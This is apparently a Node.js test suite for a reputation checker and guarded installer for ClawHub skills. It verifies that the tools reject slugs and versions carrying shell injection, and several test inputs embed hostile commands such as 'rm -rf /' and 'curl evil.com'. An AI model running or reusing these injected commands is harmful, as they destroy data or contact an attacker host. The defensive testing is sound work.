#!/usr/bin/env node

/**
 * Reputation check tests for clawsec-clawhub-checker.
 *
 * Tests cover:
 * - Input validation (command injection prevention)
 * - Reputation scoring with mocked clawhub output
 * - formatReputationWarning output formatting
 * - Enhanced installer argument parsing
 *
 * Run: node skills/clawsec-clawhub-checker/test/reputation_check.test.mjs
 */

import { fileURLToPath } from "node:url";
import path from "node:path";
import { spawn } from "node:child_process";

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const CHECKER_SCRIPT = path.resolve(__dirname, "..", "scripts", "check_clawhub_reputation.mjs");
const ENHANCED_INSTALL_SCRIPT = path.resolve(__dirname, "..", "scripts", "enhanced_guarded_install.mjs");

let passCount = 0;
let failCount = 0;

function pass(name) {
  passCount++;
  console.log(`\u2713 ${name}`);
}

function fail(name, error) {
  failCount++;
  console.error(`\u2717 ${name}`);
  console.error(`  ${String(error)}`);
}

function runScript(scriptPath, args, env) {
  return new Promise((resolve) => {
    const proc = spawn("node", [scriptPath, ...args], {
      env: { ...process.env, ...env },
      stdio: ["ignore", "pipe", "pipe"],
    });

    let stdout = "";
    let stderr = "";

    proc.stdout.on("data", (data) => {
      stdout += data.toString();
    });

    proc.stderr.on("data", (data) => {
      stderr += data.toString();
    });

    proc.on("close", (code) => {
      resolve({ code, stdout, stderr });
    });
  });
}

// -----------------------------------------------------------------------------
// Test: Invalid skill slug is rejected (command injection prevention)
// -----------------------------------------------------------------------------
async function testInvalidSlugRejected() {
  const testName = "reputation_check: invalid slug with shell metacharacters is rejected";
  try {
    const result = await runScript(CHECKER_SCRIPT, ['test; rm -rf /', '', '70']);
    let parsed;
    try {
      parsed = JSON.parse(result.stdout);
    } catch {
      fail(testName, `Could not parse output: ${result.stdout}`);
      return;
    }

    if (parsed.score === 0 && parsed.safe === false && parsed.warnings.some(w => w.includes("Invalid skill slug"))) {
      pass(testName);
    } else {
      fail(testName, `Expected score 0 with invalid slug warning, got: ${JSON.stringify(parsed)}`);
    }
  } catch (error) {
    fail(testName, error);
  }
}

// -----------------------------------------------------------------------------
// Test: Invalid version format is rejected (command injection prevention)
// -----------------------------------------------------------------------------
async function testInvalidVersionRejected() {
  const testName = "reputation_check: invalid version with shell metacharacters is rejected";
  try {
    const result = await runScript(CHECKER_SCRIPT, ['test-skill', '1.0.0; curl evil.com', '70']);
    let parsed;
    try {
      parsed = JSON.parse(result.stdout);
    } catch {
      fail(testName, `Could not parse output: ${result.stdout}`);
      return;
    }

    if (parsed.score === 0 && parsed.safe === false && parsed.warnings.some(w => w.includes("Invalid version format"))) {
      pass(testName);
    } else {
      fail(testName, `Expected score 0 with invalid version warning, got: ${JSON.stringify(parsed)}`);
    }
  } catch (error) {
    fail(testName, error);
  }
}

// -----------------------------------------------------------------------------
// Test: Valid slug and version pass input validation
// -----------------------------------------------------------------------------
async function testValidInputsAccepted() {
  const testName = "reputation_check: valid slug and semver pass input validation";
  try {
    // clawhub is not installed, so the check will fail at the inspect step,
    // but it should NOT fail at input validation
    const result = await runScript(CHECKER_SCRIPT, ['my-test-skill', '1.0.0', '70']);
    let parsed;
    try {
      parsed = JSON.parse(result.stdout);
    } catch {
      fail(testName, `Could not parse output: ${result.stdout}`);
      return;
    }

    // Should not contain input validation errors
    const hasInputError = parsed.warnings.some(
      w => w.includes("Invalid skill slug") || w.includes("Invalid version format")
    );
    if (!hasInputError) {
      pass(testName);
    } else {
      fail(testName, `Valid inputs were rejected: ${JSON.stringify(parsed.warnings)}`);
    }
  } catch (error) {
    fail(testName, error);
  }
}

// -----------------------------------------------------------------------------
// Test: Slug with uppercase or special chars is rejected
// -----------------------------------------------------------------------------
async function testUppercaseSlugRejected() {
  const testName = "reputation_check: uppercase slug is rejected";
  try {
    const result = await runScript(CHECKER_SCRIPT, ['Test-Skill', '1.0.0', '70']);
    let parsed;
    try {
      parsed = JSON.parse(result.stdout);
    } catch {
      fail(testName, `Could not parse output: ${result.stdout}`);
      return;
    }

    if (parsed.score === 0 && parsed.safe === false) {
      pass(testName);
    } else {
      fail(testName, `Expected uppercase slug to be rejected, got: ${JSON.stringify(parsed)}`);
    }
  } catch (error) {
    fail(testName, error);
  }
}

// -----------------------------------------------------------------------------
// Test: Empty slug shows usage error
// -----------------------------------------------------------------------------
async function testEmptySlugShowsUsage() {
  const testName = "reputation_check: empty slug shows usage error";
  try {
    const result = await runScript(CHECKER_SCRIPT, []);

    if (result.code === 1 && result.stderr.includes("Usage:")) {
      pass(testName);
    } else {
      fail(testName, `Expected exit 1 with usage message, got code ${result.code}: ${result.stderr}`);
    }
  } catch (error) {
    fail(testName, error);
  }
}

// -----------------------------------------------------------------------------
// Test: Version with pre-release tag is accepted
// -----------------------------------------------------------------------------
async function testPreReleaseVersionAccepted() {
  const testName = "reputation_check: pre-release version format is accepted";
  try {
    const result = await runScript(CHECKER_SCRIPT, ['test-skill', '1.0.0-beta.1', '70']);
    let parsed;
    try {
      parsed = JSON.parse(result.stdout);
    } catch {
      fail(testName, `Could not parse output: ${result.stdout}`);
      return;
    }

    const hasVersionError = parsed.warnings.some(w => w.includes("Invalid version format"));
    if (!hasVersionError) {
      pass(testName);
    } else {
      fail(testName, `Pre-release version was rejected: ${JSON.stringify(parsed.warnings)}`);
    }
  } catch (error) {
    fail(testName, error);
  }
}

// -----------------------------------------------------------------------------
// Test: CLI entrypoint guard works when script path is relative
// -----------------------------------------------------------------------------
async function testRelativePathCliEntrypointWorks() {
  const testName = "reputation_check: CLI entrypoint works with relative script path";
  try {
    const relativeCheckerScript = path.relative(process.cwd(), CHECKER_SCRIPT);
    const result = await runScript(relativeCheckerScript, ['bad slug', '', '70']);

    let parsed;
    try {
      parsed = JSON.parse(result.stdout);
    } catch {
      fail(testName, `Could not parse output with relative script path: ${result.stdout}`);
      return;
    }

    if (
      result.code === 43 &&
      parsed.safe === false &&
      parsed.warnings.some((w) => w.includes("Invalid skill slug"))
    ) {
      pass(testName);
    } else {
      fail(
        testName,
        `Expected exit 43 with invalid slug warning via relative path, got code ${result.code}: ${JSON.stringify(parsed)}`
      );
    }
  } catch (error) {
    fail(testName, error);
  }
}

// -----------------------------------------------------------------------------
// Test: Invalid threshold format is rejected in CLI mode
// -----------------------------------------------------------------------------
async function testInvalidThresholdRejected() {
  const testName = "reputation_check: invalid threshold is rejected";
  try {
    const result = await runScript(CHECKER_SCRIPT, ['test-skill', '1.0.0', 'abc']);

    if (result.code === 1 && result.stderr.includes("Invalid threshold")) {
      pass(testName);
    } else {
      fail(
        testName,
        `Expected exit 1 with invalid threshold message, got code ${result.code}: ${result.stderr}`
      );
    }
  } catch (error) {
    fail(testName, error);
  }
}

// -----------------------------------------------------------------------------
// Test: Enhanced installer rejects invalid skill name
// -----------------------------------------------------------------------------
async function testEnhancedInstallerRejectsInvalidSkill() {
  const testName = "enhanced_install: rejects skill name with invalid characters";
  try {
    const result = await runScript(ENHANCED_INSTALL_SCRIPT, ['--skill', 'bad skill!']);

    if (result.code === 1 && result.stderr.includes("Invalid --skill value")) {
      pass(testName);
    } else {
      fail(testName, `Expected exit 1 with invalid skill error, got code ${result.code}: ${result.stderr}`);
    }
  } catch (error) {
    fail(testName, error);
  }
}

// -----------------------------------------------------------------------------
// Test: Enhanced installer requires --skill argument
// -----------------------------------------------------------------------------
async function testEnhancedInstallerRequiresSkill() {
  const testName = "enhanced_install: requires --skill argument";
  try {
    const result = await runScript(ENHANCED_INSTALL_SCRIPT, []);

    if (result.code === 1 && result.stderr.includes("Missing required argument")) {
      pass(testName);
    } else {
      fail(testName, `Expected exit 1 with missing argument error, got code ${result.code}: ${result.stderr}`);
    }
  } catch (error) {
    fail(testName, error);
  }
}

// -----------------------------------------------------------------------------
// Test: Enhanced installer rejects invalid threshold
// -----------------------------------------------------------------------------
async function testEnhancedInstallerRejectsInvalidThreshold() {
  const testName = "enhanced_install: rejects invalid reputation threshold";
  try {
    const result = await runScript(ENHANCED_INSTALL_SCRIPT, [
      '--skill', 'test-skill', '--reputation-threshold', '150'
    ]);

    if (result.code === 1 && result.stderr.includes("Invalid --reputation-threshold")) {
      pass(testName);
    } else {
      fail(testName, `Expected exit 1 with invalid threshold error, got code ${result.code}: ${result.stderr}`);
    }
  } catch (error) {
    fail(testName, error);
  }
}

// -----------------------------------------------------------------------------
// Test: formatReputationWarning
// -----------------------------------------------------------------------------
async function testFormatReputationWarning() {
  const testName = "reputation: formatReputationWarning formats correctly";
  try {
    const { formatReputationWarning } = await import(
      path.resolve(__dirname, "..", "hooks", "clawsec-advisory-guardian", "lib", "reputation.mjs")
    );

    // Safe reputation — should return empty
    const safeResult = formatReputationWarning({ score: 80, warnings: [] });
    if (safeResult !== "") {
      fail(testName, `Expected empty string for safe score, got: "${safeResult}"`);
      return;
    }

    // Unsafe reputation — should contain warning
    const unsafeResult = formatReputationWarning({ score: 45, warnings: ["Low downloads", "New author"] });
    if (
      unsafeResult.includes("REPUTATION WARNING") &&
      unsafeResult.includes("45/100") &&
      unsafeResult.includes("Low downloads") &&
      unsafeResult.includes("New author")
    ) {
      pass(testName);
    } else {
      fail(testName, `Unexpected format: "${unsafeResult}"`);
    }
  } catch (error) {
    fail(testName, error);
  }
}

// -----------------------------------------------------------------------------
// Test: formatReputationWarning handles null/undefined
// -----------------------------------------------------------------------------
async function testFormatReputationWarningNull() {
  const testName = "reputation: formatReputationWarning handles null input";
  try {
    const { formatReputationWarning } = await import(
      path.resolve(__dirname, "..", "hooks", "clawsec-advisory-guardian", "lib", "reputation.mjs")
    );

    const nullResult = formatReputationWarning(null);
    const undefinedResult = formatReputationWarning(undefined);

    if (nullResult === "" && undefinedResult === "") {
      pass(testName);
    } else {
      fail(testName, `Expected empty for null/undefined, got: "${nullResult}", "${undefinedResult}"`);
    }
  } catch (error) {
    fail(testName, error);
  }
}

// -----------------------------------------------------------------------------
// Test: Enhanced installer validates --version even with --confirm-reputation
// -----------------------------------------------------------------------------
async function testEnhancedInstallerRejectsInvalidVersion() {
  const testName = "enhanced_install: rejects invalid version format even with --confirm-reputation";
  try {
    const result = await runScript(ENHANCED_INSTALL_SCRIPT, [
      '--skill', 'test-skill', '--version', '1.0.0;rm -rf /', '--confirm-reputation'
    ]);

    if (result.code === 1 && result.stderr.includes("Invalid --version value")) {
      pass(testName);
    } else {
      fail(
        testName,
        `Expected exit 1 with invalid version message, got code ${result.code}: ${result.stderr}`
      );
    }
  } catch (error) {
    fail(testName, error);
  }
}

// -----------------------------------------------------------------------------
// Main test runner
// -----------------------------------------------------------------------------
async function runTests() {
  console.log("=== ClawSec ClawHub Checker Tests ===\n");

  await testInvalidSlugRejected();
  await testInvalidVersionRejected();
  await testValidInputsAccepted();
  await testUppercaseSlugRejected();
  await testEmptySlugShowsUsage();
  await testPreReleaseVersionAccepted();
  await testRelativePathCliEntrypointWorks();
  await testInvalidThresholdRejected();
  await testEnhancedInstallerRejectsInvalidSkill();
  await testEnhancedInstallerRequiresSkill();
  await testEnhancedInstallerRejectsInvalidVersion();
  await testEnhancedInstallerRejectsInvalidThreshold();
  await testFormatReputationWarning();
  await testFormatReputationWarningNull();

  console.log(`\n=== Results: ${passCount} passed, ${failCount} failed ===`);

  if (failCount > 0) {
    process.exit(1);
  }
}

runTests().catch((error) => {
  console.error("Test runner failed:", error);
  process.exit(1);
});
